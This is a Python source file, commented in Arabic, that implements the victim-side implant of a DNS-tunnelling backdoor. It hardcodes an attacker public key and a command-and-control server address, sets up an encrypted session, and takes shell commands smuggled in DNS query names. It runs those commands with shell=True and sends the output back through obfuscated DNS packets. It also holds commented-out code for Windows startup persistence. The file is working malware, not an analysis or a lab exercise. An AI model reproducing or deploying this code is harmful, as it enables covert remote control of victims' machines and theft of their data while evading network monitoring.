import socket, time, random, binascii, subprocess, gc, threading, sys, platform, zlib, base64, struct
from Crypto.PublicKey import ECC
from dnslib import DNSRecord
from check_missing import check_missing_packets
# تأكد أن build_dns_message تم تحديثه ليستخدم cvc_codec كما اتفقنا سابقاً
from build_dns_message import dns_message 
from encryption import encrypt_symmetric, handshake_initiate
from decryption import decrypt_symmetric, handshake_verify
import cvc_codec  # الملف الجديد ضروري جداً هنا

# ... (نفس المتغيرات العامة السابقة) ...
ATTACKER_STATIC_PUBKEY_STR = """-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
-----END PUBLIC KEY-----"""
target_pub_key = None
CHUNK_SIZE = 13 # CVC Config: 13 bytes max (7 data + 6 header) → max 12 CVCs → 5 label depth
IS_ADDED_TO_STARTUP = False
SERVER = ("20.63.24.136", 53)
sent_chunks = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
last_received_time = None
received_chunks = {}
expected_chunks = None
CURRENT_SESSION_KEY = None
resends_requests = 0
victim_eph_privkey = None

try:
    target_pub_key = ECC.import_key(ATTACKER_STATIC_PUBKEY_STR)
except Exception as e:
    print(e)
    sys.exit(1)

def send_raw(payload_text):
    try:
        chunks = dns_message(payload_text, CHUNK_SIZE)
        for chunk in chunks:
            # jitter_delay = 0.3 + random.uniform(-0.3, 0.3)
            # time.sleep(jitter_delay)
            sock.sendto(chunk, SERVER)
    except Exception as e:
        print(e)
        pass

def send_msg(message, is_cached: bool):
    global CURRENT_SESSION_KEY, sent_chunks, sock
    if isinstance(message, str):
        message = message.encode('utf-8')
    elif isinstance(message, bytes):
        message = message
    try:
        if not CURRENT_SESSION_KEY:
            return
        encryption_result = encrypt_symmetric(message, CURRENT_SESSION_KEY)
        if encryption_result.get("success") == True:
            encrypted_bytes = encryption_result["message"]
        else:
            return
        
        chunks = dns_message(encrypted_bytes, CHUNK_SIZE)

        sent_chunks = {}
        i = 0
        for chunk in chunks:
            if is_cached:
                sent_chunks[i] = chunk
                jitter_delay = 0.002 + random.uniform(-0.002, 0.002)
                time.sleep(jitter_delay)
            sock.sendto(chunk, SERVER)
            i += 1
    except Exception as e:
        print(e)
        return


# if IS_ADDED_TO_STARTUP == False:
#     if platform.system() == "Windows":
#         from add_to_startup import add_to_windows_startup
#         try:
#             if add_to_windows_startup() == 200:
#                 IS_ADDED_TO_STARTUP = True
#         except Exception as e:
#             print(e)
#             pass
#     pass

def timeout_checker():
    global received_chunks, expected_chunks, last_received_time, resends_requests
    while True:
        try:
            if last_received_time is not None:
                if resends_requests < 3:
                    try:
                        current_session_id = None
                        current_buffer = None
                        if received_chunks:
                            current_session_id = next(iter(received_chunks))
                            current_buffer = received_chunks[current_session_id]["chunks"]
                            expected_chunks = received_chunks[current_session_id]["total"]
                        if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 3):
                            missing_packets = check_missing_packets(current_buffer, expected_chunks)
                            if missing_packets:
                                indices_str = ",".join(str(i) for i in missing_packets)
                                msg = f"RESEND:{indices_str}"
                                send_msg(msg, False)
                                resends_requests += 1
                                time.sleep(5)
                                continue
                    except Exception as e:
                        print(e)
                        pass
                else:
                    resends_requests = 0
                    last_received_time = None
                    received_chunks = {}
                    expected_chunks = None
            time.sleep(0.5)
        except Exception as e:
            print(e)
            pass
        time.sleep(0.5)

def core():
    global CHUNK_SIZE, received_chunks, expected_chunks, sent_chunks, last_received_time, CURRENT_SESSION_KEY, resends_requests, victim_eph_privkey
    
    # بدء المصافحة
    hs = handshake_initiate()
    if hs and hs.get("success"):
        victim_eph_privkey = hs.get("eph_priv_key")
        # ملاحظة: send_raw تستخدم dns_message التي أصبحت تستخدم CVC تلقائياً
        send_raw(hs.get("message"))
    
    sock.settimeout(60)
    
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            print(f"[.] Received {len(data)} bytes from {addr}")
            if len(data) < 20: continue
            
            try:
                dns_request = DNSRecord.parse(data)
            except Exception:
                continue
            
            # قبول الاستعلامات والردود
            if dns_request.header.qr == 0 or dns_request.header.qr == 1:
                
                # 1. استخراج اسم الدومين كاملاً
                query_name = str(dns_request.q.qname).rstrip('.')
                
                # 2. فك تشفير CVC (تحويل الدومين إلى بايتات خام)
                # هذه الخطوة تستبدل كل منطق split('.') القديم
                raw_packet_bytes = cvc_codec.decode_domain_to_bytes(query_name)
                
                # إذا فشل فك التشفير أو كانت البيانات قصيرة جداً (أقل من الهيدر 6 بايت)
                if not raw_packet_bytes or len(raw_packet_bytes) < 6:
                    continue

                # 3. Session ID from DNS Transaction ID (no longer in payload)
                session_id = dns_request.header.id

                # 4. قراءة الهيدر المموّه (Obfuscated Header Extraction)
                # الهيدر: Salt(2) | XOR'd Index(2) | XOR'd Total(2) = 6 bytes
                try:
                    header_bytes = raw_packet_bytes[:6]
                    chunk_data = raw_packet_bytes[6:] # باقي الباكت هو الداتا
                    
                    # فك ضغط الهيدر واستعادة القيم الحقيقية بالـ XOR
                    salt, xored_index, xored_total = struct.unpack('!HHH', header_bytes)
                    index = xored_index ^ salt
                    total = xored_total ^ salt
                except struct.error:
                    continue

                last_received_time = time.time()
                
                # 4. تخزين الشنكات (Logic التجميع)
                if session_id not in received_chunks:
                    received_chunks[session_id] = {"total": total, "chunks": {}}
                    print(f"[.] New message: session={session_id}, total={total} chunks")
                
                buffer = received_chunks[session_id]
                if index in buffer["chunks"]: continue
                
                # تخزين بايتات وليس نص
                buffer["chunks"][index] = chunk_data
                
                # 5. هل اكتملت الرسالة؟
                if len(buffer["chunks"]) == buffer["total"]:
                    print(f"[+] Message complete: {buffer['total']} chunks received")
                    # تجميع البايتات بالترتيب
                    full_payload_bytes = b"".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))
                    
                    # تنظيف الذاكرة فوراً
                    received_chunks.pop(session_id, None)
                    
                    # --- التعامل مع البيانات المجمعة ---
                    
                    # أ) هل هي مصافحة؟ (Handshake Check)
                    # المصافحة لا تكون مشفرة بـ AES، بل تكون ECC Signature
                    # نحاول التحقق منها أولاً
                    try:
                        # ملاحظة: handshake_verify تتوقع bytes الآن (وهذا صحيح)
                        hs_verify = handshake_verify(full_payload_bytes, victim_eph_privkey, target_pub_key)
                        
                        if hs_verify and hs_verify.get("success"):
                            print("[+] Handshake Verified!")
                            aes_key = hs_verify.get("master_key")
                            CURRENT_SESSION_KEY = aes_key
                            victim_eph_privkey = None # لم نعد بحاجة للمفتاح المؤقت
                            
                            # تصفير العدادات
                            expected_chunks = None
                            resends_requests = 0
                            gc.collect()
                            continue # انتهينا من هذا الباكت
                    except Exception as e:
                        pass # ليست مصافحة، نكمل لمحاولة فك تشفير AES

                    # ب) فك تشفير AES (Normal Command)
                    if CURRENT_SESSION_KEY:
                        # decrypt_symmetric تقبل bytes وترجع bytes (مضغوطة)
                        decryption_result = decrypt_symmetric(full_payload_bytes, CURRENT_SESSION_KEY)
                        
                        if decryption_result and decryption_result.get("success"):
                            plaintext_bytes = decryption_result["message"]
                            
                            # ج) فك ضغط Zlib أو معالجة النص الخام
                            try:
                                # Check for special commands first (raw bytes)
                                if plaintext_bytes == b"ACK": 
                                    full_command = "ACK"
                                elif plaintext_bytes.startswith(b"RESEND:"):
                                    full_command = plaintext_bytes.decode('utf-8')
                                else:
                                    # Try zlib decompression first (for responses from victim)
                                    # If it fails, treat as raw text (commands from attacker)
                                    try:
                                        full_command = zlib.decompress(plaintext_bytes).decode('utf-8')
                                    except zlib.error:
                                        # Not compressed - raw command from attacker
                                        full_command = plaintext_bytes.decode('utf-8')
                            except Exception as e:
                                print(f"[!] Command decode error: {e}")
                                full_command = plaintext_bytes.decode('utf-8', errors='ignore')

                            # د) تنفيذ الأمر
                            if full_command == "ACK":
                                sent_chunks = {}
                                last_received_time = None
                                
                            elif full_command.startswith("RESEND:"):
                                indices = full_command.replace("RESEND:", "").split(",")
                                for idx in indices:
                                    try:
                                        idx = int(idx)
                                        if idx in sent_chunks:
                                            sock.sendto(sent_chunks[idx], SERVER)
                                            time.sleep(0.05)
                                    except: pass
                                    
                            else:
                                # تنفيذ أمر الشل
                                try:
                                    print(f"[>] Executing: {full_command}")
                                    # تنفيذ الأمر مع معالجة الترميز
                                    result = subprocess.run(
                                        full_command,
                                        shell=True,
                                        capture_output=True,
                                        timeout=60
                                    )
                                    # دمج stdout و stderr كـ bytes ثم فك الترميز
                                    output_bytes = result.stdout + result.stderr
                                    response = output_bytes.decode('utf-8', errors='replace')
                                    print(f"[<] Response length: {len(response)} chars")
                                except subprocess.TimeoutExpired:
                                    print(f"[!] Command timed out")
                                    response = "Command timed out after 60 seconds"
                                except Exception as exec_err:
                                    print(f"[!] Exec error: {exec_err}")
                                    response = str(exec_err)

                                if not response: response = " "
                                
                                # ضغط الرد ثم إرساله
                                response_compressed = zlib.compress(response.encode('utf-8'))
                                print(f"[*] Sending response ({len(response_compressed)} bytes compressed)")
                                send_msg(response_compressed, True)
                                
                        else:
                            # فشل فك التشفير
                            print(f"[!] Decryption failed: {decryption_result}")
                            send_msg("Decryption failed.", False)
                    else:
                        # وصلنا باكت مشفر وليس معنا مفتاح
                        received_chunks.pop(session_id, None)
                        expected_chunks = None
                        resends_requests = 0
                        gc.collect()
                        continue

        except socket.timeout:
            # عند انتهاء الوقت، نرسل نبضات قلب أو نعيد المصافحة
            if not CURRENT_SESSION_KEY:
                hs = handshake_initiate()
                if hs and hs.get("success"):
                    victim_eph_privkey = hs.get("eph_priv_key")
                    send_raw(hs.get("message"))
            else:
                # Heartbeat مشفرة
                # نضغطها أولاً لتتوافق مع بروتوكول فك التشفير عند السيرفر
                hb = zlib.compress(b"heartbeat")
                send_msg(hb, False)
            continue
            
        except Exception as e:
            print(f"[!] Exception in main loop: {e}")
            pass

threads = []
thread = threading.Thread(target=core)
thread2 = threading.Thread(target=timeout_checker)
threads.append(thread)
threads.append(thread2)
for t in threads:
    t.start()